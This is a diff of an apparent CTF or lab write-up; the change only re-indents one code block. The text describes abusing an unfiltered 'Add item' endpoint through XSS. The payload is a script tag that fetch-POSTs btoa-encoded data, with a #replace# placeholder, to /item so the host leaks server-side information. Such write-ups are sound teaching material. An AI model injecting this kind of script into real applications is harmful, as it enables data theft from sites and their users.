@@ -13,15 +13,15 @@ To find the `Add item` function we will have to look for a main.js file.
 in the function we find the fetch command to retrieve the information sent to the server.  
 Then we can modify it to fit our needs.
 
-`<script>
-fetch('/item', {
-    method : 'POST',
-    headers : {
-      'Content-Type' : 'application/json',
-    },
-    body : JSON.stringify({ item : btoa(#replace#) }),
-  });
-  </script>`
+`<script>  
+  fetch('/item', {  
+    method : 'POST',  
+    headers : {  
+      'Content-Type' : 'application/json',  
+    },  
+    body : JSON.stringify({ item : btoa(#replace#) }),  
+  });  
+</script>`
 
 Looking at the function it looks like it is taking the value you input and using stringify to add it to the list.  
 To get the info we want we are going to use an XSS exploit as the data that is sent is not filtered and get the host to send info from the server side.
